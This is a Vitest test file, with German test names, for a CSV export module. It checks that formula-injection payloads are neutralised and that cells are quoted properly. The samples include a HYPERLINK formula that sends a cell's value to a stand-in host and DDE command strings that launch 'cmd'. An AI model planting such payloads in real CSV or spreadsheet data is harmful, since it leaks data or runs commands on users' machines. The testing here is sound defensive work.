import { describe, it, expect } from 'vitest';
import { csvCell, csvRow, neutralizeFormula } from './csv';

describe('neutralizeFormula', () => {
	it('entschärft Formel-Anfänge mit Buchstaben oder Bezügen', () => {
		expect(neutralizeFormula('=HYPERLINK("https://x.example/?"&A2,"Karte")')).toBe(
			`'=HYPERLINK("https://x.example/?"&A2,"Karte")`
		);
		expect(neutralizeFormula('+cmd|"/c calc"!A1')).toBe(`'+cmd|"/c calc"!A1`);
		expect(neutralizeFormula('-2+3+cmd|x')).toBe(`'-2+3+cmd|x`);
		expect(neutralizeFormula('@SUM(A1:A9)')).toBe(`'@SUM(A1:A9)`);
		expect(neutralizeFormula('\t=1+1')).toBe(`'\t=1+1`);
		expect(neutralizeFormula('\r=1+1')).toBe(`'\r=1+1`);
		expect(neutralizeFormula('=1+1')).toBe(`'=1+1`);
	});

	it('lässt Telefonnummern und Zahlen unverändert', () => {
		expect(neutralizeFormula('+49 228 123456')).toBe('+49 228 123456');
		expect(neutralizeFormula('+49 (0)228 / 12-34')).toBe('+49 (0)228 / 12-34');
		expect(neutralizeFormula('-5')).toBe('-5');
		expect(neutralizeFormula('0228 123')).toBe('0228 123');
	});

	it('lässt normalen Text unverändert', () => {
		expect(neutralizeFormula('Müller-Lüdenscheidt')).toBe('Müller-Lüdenscheidt');
		expect(neutralizeFormula('a=b')).toBe('a=b');
		expect(neutralizeFormula('')).toBe('');
	});
});

describe('csvCell / csvRow', () => {
	it('quotet und verdoppelt Anführungszeichen', () => {
		expect(csvCell('Sag "Hallo"')).toBe('"Sag ""Hallo"""');
		expect(csvCell(null)).toBe('""');
		expect(csvCell(3)).toBe('"3"');
	});

	it('kombiniert Formel-Schutz und Quoting', () => {
		expect(csvCell('=A1&"x"')).toBe(`"'=A1&""x"""`);
	});

	it('baut eine Zeile', () => {
		expect(csvRow(['Meier', 'Anna', 2])).toBe('"Meier","Anna","2"');
	});
});
